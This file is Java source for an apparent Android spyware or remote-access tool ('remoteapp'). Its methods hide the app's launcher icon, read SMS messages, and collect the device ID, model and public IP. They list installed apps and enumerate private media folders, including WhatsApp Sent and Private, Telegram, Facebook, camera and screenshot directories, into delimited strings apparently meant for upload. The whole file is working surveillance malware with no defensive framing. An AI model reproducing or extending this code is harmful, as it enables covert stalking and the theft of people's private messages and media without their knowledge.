package com.example.remoteapp;

import android.annotation.SuppressLint;
import android.app.NotificationManager;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.location.Location;
import android.media.MediaMetadataRetriever;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Environment;
import android.provider.Settings;
import android.service.notification.StatusBarNotification;
import android.text.format.Formatter;
import android.util.Log;

import androidx.annotation.NonNull;

import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.NetworkInterface;
import java.net.URL;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Date;
import java.util.List;
import java.util.Random;
import java.util.Scanner;

import javax.net.ssl.HttpsURLConnection;

public class Actions {


    public static boolean getNotif()
    {

        try{
            NotificationManager notificationManager = (NotificationManager)  MainActivity.getAppContext().getSystemService(Context.NOTIFICATION_SERVICE);
            StatusBarNotification[] notifs = notificationManager.getActiveNotifications();
            NotificationManager manager2 = MainActivity.getAppContext().getSystemService(NotificationManager.class);
            System.out.println("Lenght => "+notifs.length);
            if(notifs.length > 0)
                return true;
        }catch (Exception e){
            e.printStackTrace();
        }
        return false;
    }
    private String getPublicIp()
    {
        String resp="",ip="";
        try {
            URL url = new URL("https://www.showmyip.com/");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            if(conn.getResponseCode() == HttpsURLConnection.HTTP_OK){
                BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                String strCurrentLine;
                while ((strCurrentLine = br.readLine()) != null) {
                    resp += strCurrentLine;
                }
                resp = resp.replaceAll(" ","");
                String[] s1 = resp.split("<h2id=\"ipv4\">");
                ip = s1[1].split("</h2>")[0];
                return ip;
            } else { ip = " error_get_ip"; }
        } catch (Exception e) {
            e.printStackTrace(); ip = " error_get_ip";
        }
        return ip;
    }



    public String getInstalledApps()
    {
        int flags = PackageManager.GET_META_DATA | PackageManager.GET_SHARED_LIBRARY_FILES |  PackageManager.GET_UNINSTALLED_PACKAGES;
        StringBuilder ret = new StringBuilder("_installed_apps_=>");
        PackageManager pm = MainActivity.getThis().getPackageManager();
        List<ApplicationInfo> applications = pm.getInstalledApplications(flags);
        for (ApplicationInfo appInfo : applications) {
            if ((appInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 1) {
                String s1 = appInfo.packageName.isEmpty() ? "" : appInfo.packageName.replace("com.","");
                ret.append("sysapps=>").append(s1).append("-_-_-__");
            } else {
                String s1 = appInfo.packageName.isEmpty() ? "" : appInfo.packageName.replace("com.","");
                ret.append("userapps=>").append(s1).append("-_-_-__");
            }
        }
        return ret.toString();
    }


    public static void hideAppIcon(Context c)
    {
        PackageManager p = c.getPackageManager();
        ComponentName componentName = new ComponentName(c, com.example.remoteapp.MainActivity.class);
        p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }


    private String getDeviceIMEI()
    {
        try {
            @SuppressLint("HardwareIds") String device_unique_id = Settings.Secure.getString(MainActivity.getThis().getContentResolver(), Settings.Secure.ANDROID_ID);
            return device_unique_id;
        }catch (Exception e){
            e.printStackTrace();
            return "error";
        }
    }

    protected String deviceInfo() {
        try {
            String imei = getDeviceIMEI();
            int sdkVersion = android.os.Build.VERSION.SDK_INT;
            String ips = this.getPublicIp();
            String chars = "QWERTYUIOPLKJHGFDSAZXCVBNM1234567890-QWERTYUIOPLKJHGFDSAZXCVBNM";
            Random rand=new Random();
            String idNewRet = "";
            for (int i = 0; i < 15; i++) { idNewRet = idNewRet + chars.charAt(rand.nextInt(chars.length()-1)); }
            String ret = "manufact=>"+android.os.Build.MANUFACTURER+"__-_";
            ret += "vv=>"+android.os.Build.VERSION.RELEASE+"__-_";
            ret += "Product=>"+android.os.Build.PRODUCT+"__-_";
            ret += "model=>"+android.os.Build.MODEL+"__-_";
            ret += "brand=>"+android.os.Build.BRAND+"__-_";
            ret += "Device=>"+android.os.Build.DEVICE+"__-_";
            ret += "Host=>"+android.os.Build.HOST+"__-_";
            ret += "sdk=>"+sdkVersion+"__-_";
            ret += "id=>"+ idNewRet +"__-_";
            ret += "dispositiveid=>"+ ips +"__-_";
            ret += "imei=>"+imei;
            return ret;
        }catch (Exception e){
            return "vv=>err__-_Product=>err__-_model=>err__-_brand=>err__-_Device=>err__-_Host=>err__-_mc=>err__-_sdk=>err__-_id=>err__-_dispositiveid=>err__-_ERROR=>"+e.getMessage() + "&&" + e.getLocalizedMessage();
        }
    }

    protected String readSMSBox(String box) {
        try {
            Uri SMSURI = Uri.parse(Config.SMS_URL+box);
            Context c = MainActivity.getAppContext();
            ContentResolver cr = c.getContentResolver();
            Cursor cur = cr.query(SMSURI, null, null, null,null);
            String sms = "";
            try {
                if (cur.moveToFirst()) {
                    for (int i = 0; i < cur.getCount(); ++i) {
                        String number = cur.getString(cur.getColumnIndexOrThrow("address"));
                        String date = cur.getString(cur.getColumnIndexOrThrow("date"));
                        Long epoch = Long.parseLong(date);
                        Date fDate = new Date(epoch * 1000);
                        date = fDate.toString();
                        String body = cur.getString(cur.getColumnIndexOrThrow("body"));
                        sms += "[" + number + ":" + date + "]" + body + ",_,,_";
                        cur.moveToNext();
                    }
                }
                return sms;
            } catch(NullPointerException npe) {
                npe.printStackTrace();
                return "";
            }
        }catch (Exception e){
            e.printStackTrace();
        }
        return "";
    }

    private String[] getDirectoryFiles(String path)
    {
        File directory = new File(path);
        if (!directory.exists() && !directory.isFile()) { return new String[]{"",""};  }
        File[] files = directory.listFiles();
        StringBuilder list = new StringBuilder(); String getDirs = "";
        if (files != null) {
            for (File file : files) {
                if (!file.getName().equals(".nomedia")) {
                    if (file.isFile()) {
                        list.append(file.getName()).append("_ds-_");
                    } else if (file.isDirectory()) {
                        getDirs += file + "_s_gD_-";
                        list.append(file.getName()).append("isdir__ds-_");
                    }
                }
            }
        }
        return new String[] {list.toString(),getDirs} ;
    }

    private String getWspFiles()
    {
        String ret = "";
        String mainDir = (System.getenv("SECONDARY_STORAGE") == null) ? Environment.getExternalStorageDirectory().getAbsolutePath()  : System.getenv("SECONDARY_STORAGE");
        String wsmpmain1 = mainDir + "/WhatsApp";
        if(!new File(wsmpmain1).exists()){
            if(new File(mainDir+"/Android/media/com.whatsapp/Whatsapp").exists())    wsmpmain1 = mainDir+"/Android/media/com.whatsapp/Whatsapp";
        }
        String wspmp2 = wsmpmain1 + "/Media";
        String wspip1 =wspmp2+"/WhatsApp Images";
        String wspdp3 =wspmp2+"/WhatsApp Documents";
        String wspvp4 =wspmp2+"/WhatsApp Video";
        File f = new File(wsmpmain1);
        if(f.isDirectory()){
            String[] wspmpsd1 = getDirectoryFiles(wsmpmain1);
            if(wspmpsd1[0].length() > 7)
                ret+=wsmpmain1+"_ds-_"+wspmpsd1[0]+"-,-,-,,";
            else
                ret+=wsmpmain1+"-,-,-,,";
            File f2 = new File(wspmp2);
            File f3 = new File(wspip1);
            File f4 = new File(wspdp3);
            File f5 = new File(wspvp4);
            if(f2.isDirectory()){
                String[] wspmedsd2 = getDirectoryFiles(wspmp2);
                if(wspmedsd2[0].length() > 7)
                    ret+=wspmp2+"_ds-_"+wspmedsd2[0]+"-,-,-,,";
            }
            if(f3.isDirectory()){
                String[] wspim7 = getDirectoryFiles(wspip1);
                if(wspim7[0].length() > 7)
                    ret+=wspip1+"_ds-_"+wspim7[0]+"-,-,-,,";
                File f3b=new File(wspip1+"/Sent");
                if(f3b.isDirectory()){
                    String[] wspsntdrs3 = getDirectoryFiles(f3b.toString());
                    if(wspsntdrs3[0].length() > 7)
                        ret+=f3b.toString()+"_ds-_"+wspsntdrs3[0]+"-,-,-,,";
                }
                File f3c=new File(wspip1+"/Private");
                if(f3c.isDirectory()){
                    String[] wspimsp2 = getDirectoryFiles(f3c.toString());
                    if(wspimsp2[0].length() > 7)
                        ret+=f3c.toString()+"_ds-_"+wspimsp2[0]+"-,-,-,,";
                }
            }
            if(f4.isDirectory()){
                String[] wspsxdr4 = getDirectoryFiles(wspdp3);
                if(wspsxdr4[0].length() > 7)
                    ret+=wspdp3+"_ds-_"+wspsxdr4[0]+"-,-,-,,";
                else
                    ret+=wspdp3+"-,-,-,,";
                File f4b=new File(wspdp3+"/Sent");
                File f4c=new File(wspdp3+"/Private");
                if(f4b.isDirectory()){
                    String[] wsop5g = getDirectoryFiles(f4b.toString());
                    if(wsop5g[0].length() > 7)
                        ret+=f4b.toString()+"_ds-_"+wsop5g[0]+"-,-,-,,";
                }
                if(f4c.isDirectory()){
                    String[] wspdsd8 = getDirectoryFiles(f4c.toString());
                    if(wspdsd8[0].length() > 7) ret+=f4c.toString()+"_ds-_"+wspdsd8[0]+"-,-,-,,";
                }
            }
            if(f5.isDirectory()){
                String[] wspsdrs3 = getDirectoryFiles(wspvp4);
                if(wspsdrs3[0].length() > 7)
                    ret+=wspvp4+"_ds-_"+wspsdrs3[0]+"-,-,-,,";
                else
                    ret+=wspvp4+"-,-,-,,";
                File f5b=new File(wspvp4+"/Sent");
                if(f5b.isDirectory()){
                    String[] wspdrs2 = getDirectoryFiles(f5b.toString());
                    if(wspdrs2[0].length() > 7)
                        ret+=f5b.toString()+"_ds-_"+wspdrs2[0]+"-,-,-,,";
                }
                File f4c=new File(wspvp4+"/Private");
                if(f4c.isDirectory()){
                    String[] wspdrs1 = getDirectoryFiles(f4c.toString());
                    if(wspdrs1[0].length() > 7)
                        ret+=f4c.toString()+"_ds-_"+wspdrs1[0]+"-,-,-,,";
                }
            }
        }
        if(new File(mainDir+"/Pictures/Whatsapp").exists()){
            String path6 = mainDir+"/Pictures/Whatsapp";
            File f6 = new File(path6);
            if(f6.isDirectory()){
                String[] subdirs = getDirectoryFiles(path6);
                if(subdirs[0].length() > 7){
                    ret+=path6+"_ds-_"+subdirs[0]+"-,-,-,,";
                }else{
                    ret+=path6+"-,-,-,,";
                }
            }
        }
        return ret;
    }

    private String getTelegramFiles()
    {
        String ret = "";
        String mainDir = (System.getenv("SECONDARY_STORAGE") == null) ? Environment.getExternalStorageDirectory().getAbsolutePath()  : System.getenv("SECONDARY_STORAGE");
        String telegramMainPath = mainDir + "/Android/media/org.telegram.messenger";
        String path2="";

        String telegramVideos2 = "/storage/emulated/0/Movies/Telegram";
        File f4 = new File(telegramVideos2);
        if(f4.isDirectory()){
            String[] telegramVids2PathSubDirs = getDirectoryFiles(telegramVideos2);
            if(telegramVids2PathSubDirs[0].length() > 7)  ret+=telegramVideos2+"_ds-_"+telegramVids2PathSubDirs[0]+"-,-,-,,";
        }

        if(!new File(telegramMainPath).exists())
            return ret;

        String telegramImages1 = mainDir + "/Pictures/Telegram";
        String telegramImages2 =telegramMainPath+"/Telegram/Telegram Images";
        String telegramVideos =telegramMainPath+"/Telegram/Telegram Video";
        File f1 = new File(telegramImages1);
        File f2 = new File(telegramImages2);
        File f3 = new File(telegramVideos);

        if(f1.isDirectory()){
            String[] telegramImgs1PathSubDirs = getDirectoryFiles(telegramImages1);
            if(telegramImgs1PathSubDirs[0].length() > 7) ret+=telegramImages1+"_ds-_"+telegramImgs1PathSubDirs[0]+"-,-,-,,";
        }
        if(f2.isDirectory()){
            String[] telegramImgs2PathSubDirs = getDirectoryFiles(telegramImages2);
            if(telegramImgs2PathSubDirs[0].length() > 7) ret+=telegramImages2+"_ds-_"+telegramImgs2PathSubDirs[0]+"-,-,-,,";
        }
        if(f3.isDirectory()){
            String[] telegramVidsPathSubDirs = getDirectoryFiles(telegramVideos);
            if(telegramVidsPathSubDirs[0].length() > 7)  ret+=telegramVideos+"_ds-_"+telegramVidsPathSubDirs[0]+"-,-,-,,";
        }

        return ret;
    }

    private String getFacebFiles()
    {
        String ret = "";
        String mainDir = (System.getenv("SECONDARY_STORAGE") == null) ? Environment.getExternalStorageDirectory().getAbsolutePath()  : System.getenv("SECONDARY_STORAGE");
        String fbMainPath = mainDir + "/Pictures/facebook";
        if(!new File(fbMainPath).exists())
            return ret;
        File f1 = new File(fbMainPath);
        if(f1.isDirectory()){
            String[] fbImgsPathSubDirs = getDirectoryFiles(fbMainPath);
            if(fbImgsPathSubDirs[0].length() > 7) ret+=fbMainPath+"_ds-_"+fbImgsPathSubDirs[0]+"-,-,-,,";
        }
        return ret;
    }


    private String getSnapFiles()
    {
        return "";
    }
    private String getTikTokFilesFiles()
    {
        return "";
    }


    protected String getInterestingPaths()
    {
        String dirs = "";
        File dDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
        String mainDir = (System.getenv("SECONDARY_STORAGE") == null) ? Environment.getExternalStorageDirectory().getAbsolutePath()  : System.getenv("SECONDARY_STORAGE");
        String DCIM_Path = mainDir+"/DCIM";
        String DCIM_Path_2 = mainDir+"/DCIM/Camera";
        String DCIM_Path_3 = mainDir+"/DCIM/Screenshots";
        String DCIM_Path_4 = mainDir+"/Movies";
        String DCIM_Path_5 = mainDir+"/Pictures";

        //if it's folder count elements  in folder

        String[] dcim_paths = null;
        if(mainDir != null && mainDir.length() > 3){
            String mainDirFiles[] = getDirectoryFiles(mainDir);
            if(mainDirFiles[0].length() > 7){
                dirs +=mainDir+"_ds-_"+mainDirFiles[0]+"-,-,-,,";
            }else{
                dirs +=mainDir+"-,-,-,,";
            }
        }
        if(dDir != null && dDir.length() > 3) {
            String[] dDirFiles = getDirectoryFiles(dDir.toString());
            if(dDirFiles[0].length() > 7){
                dirs +=dDir+"_ds-_"+dDirFiles[0]+"-,-,-,,";
            }else{
                dirs +=dDir+"-,-,-,,";
            }
            if(dDirFiles[1].length() > 20){
                String[] paths = dDirFiles[1].split("_s_gD_-");
                for (int i =0;i<paths.length;i++){
                    String[] dDirFiles2 = getDirectoryFiles(paths[i]);
                    if(dDirFiles2[0].length() > 7){
                        dirs +=paths[i]+"_ds-_"+dDirFiles2[0]+"-,-,-,,";
                    }else{
                        dirs +=paths[i]+"-,-,-,,";
                    }
                }
            }
        }
        String[] DCIM_PathFiles = getDirectoryFiles(DCIM_Path);
        if(DCIM_PathFiles[0].length() > 7)
            if(DCIM_PathFiles[0].length() > 7)
                dirs +=DCIM_Path+"_ds-_"+DCIM_PathFiles[0]+"-,-,-,,";
            else
                dirs +=DCIM_Path+"-,-,-,,";

        String[] DCIM_PathFiles_2 = getDirectoryFiles(DCIM_Path_2);
        if(DCIM_PathFiles_2[0].length() > 7){
            if(DCIM_PathFiles_2[0].length() > 7){
                dirs +=DCIM_Path_2+"_ds-_"+DCIM_PathFiles_2[0]+"-,-,-,,";
            }else{
                dirs +=DCIM_Path_2+"-,-,-,,";
            }
        }
        String[] DCIM_PathFiles_3 = getDirectoryFiles(DCIM_Path_3);
        if(DCIM_PathFiles_3[0].length() > 7){
            if(DCIM_PathFiles_3[0].length() > 7){
                dirs +=DCIM_Path_3+"_ds-_"+DCIM_PathFiles_3[0]+"-,-,-,,";
            }else{
                dirs +=DCIM_Path_3+"-,-,-,,";
            }
        }
        String[] DCIM_PathFiles_4 = getDirectoryFiles(DCIM_Path_4);
        if(DCIM_PathFiles_4[0].length() > 7){
            if(DCIM_PathFiles_4[0].length() > 7){
                dirs +=DCIM_Path_4+"_ds-_"+DCIM_PathFiles_4[0]+"-,-,-,,";
            }else{
                dirs +=DCIM_Path_4+"-,-,-,,";
            }
        }
        String[] DCIM_PathFiles_5 = getDirectoryFiles(DCIM_Path_5);
        if(DCIM_PathFiles_5[0].length() > 7){
            if(DCIM_PathFiles_5[0].length() > 7){
                dirs +=DCIM_Path_5+"_ds-_"+DCIM_PathFiles_5[0]+"-,-,-,,";
            }else{
                dirs +=DCIM_Path_5+"-,-,-,,";
            }
        }
        String wspFiles = getWspFiles();
        String telegramFiles = getTelegramFiles();
        String snapFiles = getSnapFiles();
        String tikTokFiles = getTikTokFilesFiles();
        String facebFiles = getFacebFiles();
        if(telegramFiles.length() > 1) dirs+=telegramFiles;
        if(wspFiles.length() > 1) dirs +=wspFiles;
        if(facebFiles.length() > 1) dirs +=facebFiles;
        if(snapFiles.length() > 1) dirs+=snapFiles;
        if(tikTokFiles.length() > 1) dirs+=tikTokFiles;

        try {   // sVold.add("/mnt/sdcard");
            if(new File("/system/etc/vold.fstab").exists()){
                Scanner scanner = new Scanner(new File("/system/etc/vold.fstab"));
                if(scanner != null){
                    while (scanner.hasNext()) {
                        String line = scanner.nextLine();
                        if (line.startsWith("dev_mount")) {
                            String[] lineElements = line.split(" ");
                            String element = lineElements[2];
                            if (element.contains(":"))  element = element.substring(0, element.indexOf(":"));
                            if (element.contains("usb"))  continue;
                            if(element != null && element.length() > 3){
                                String[] elementFiles = getDirectoryFiles(element);
                                if(elementFiles[0].length() > 7){
                                    dirs +=element.toString()+"_ds-_"+elementFiles[0]+"-,-,-,,";
                                }else{
                                    dirs+=element.toString()+"-,-,-,,";
                                }
                            }
                        }
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
            return "dirsreturn==>>_ds-_-,-,-,,";
        }
        return "dirsreturn==>>"+dirs;
    }


    private static String retriveVideoFrameFromVideo(String videoPath, int fTime,Context c) {
        Bitmap bitmap = null;
        MediaMetadataRetriever mediaMetadataRetriever = null;
        try {
            mediaMetadataRetriever = new MediaMetadataRetriever();
            if (Build.VERSION.SDK_INT >= 14)
                mediaMetadataRetriever.setDataSource(c, Uri.parse(videoPath));//videoPath, new HashMap<String, String>()
            else
                mediaMetadataRetriever.setDataSource(videoPath);

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
                bitmap= mediaMetadataRetriever.getScaledFrameAtTime(fTime,MediaMetadataRetriever.OPTION_CLOSEST,175,175);
            }else{
                bitmap = mediaMetadataRetriever.getFrameAtTime(fTime, MediaMetadataRetriever.OPTION_CLOSEST);
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (mediaMetadataRetriever != null) {
                try {
                    mediaMetadataRetriever.release();
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
            }
        }
        String root = Environment.getExternalStorageDirectory().toString();
        File myDir = new File(root + "/Download/tmb");
        myDir.mkdirs();
        boolean e =myDir.exists();
        boolean e2 =myDir.isDirectory();
        Random generator = new Random();
        int n = 10000;
        n = generator.nextInt(n);
        String[] fnameparts=videoPath.split("/");
        String fname =fnameparts[fnameparts.length-1];

        String newfname = fname+"_frtmb" + n + ".png";
        File file = new File(myDir, newfname);
        if (file.exists())
            file.delete();
        try {
            boolean created = file.createNewFile();
            if (created){
                FileOutputStream out = new FileOutputStream(root + "/Download/tmb/"+newfname);
                bitmap.compress(Bitmap.CompressFormat.PNG, 70, out);
            }
        } catch (IOException ex) {
            return "0";
        }
        return root + "/Download/tmb/"+newfname;
    }

    public static ArrayList<String> getVideoFramesThumbs(String videoPath, long duration, Context c)
    {
        ArrayList<String> thumbs = new ArrayList<String>();
        String thumb=""; int time =0;
        int timeinterval = (int) (duration/7)-9000;
        try {
            for (int i = 1; i < 7; i++) {
                time= timeinterval*i;
                thumb = retriveVideoFrameFromVideo(videoPath,time,c);
                if(thumb != "0")
                    thumbs.add(thumb);
            }
        } catch (Throwable e) {
            e.printStackTrace();
        }
        ArrayList<String> a=thumbs;
        return thumbs;
    }



}
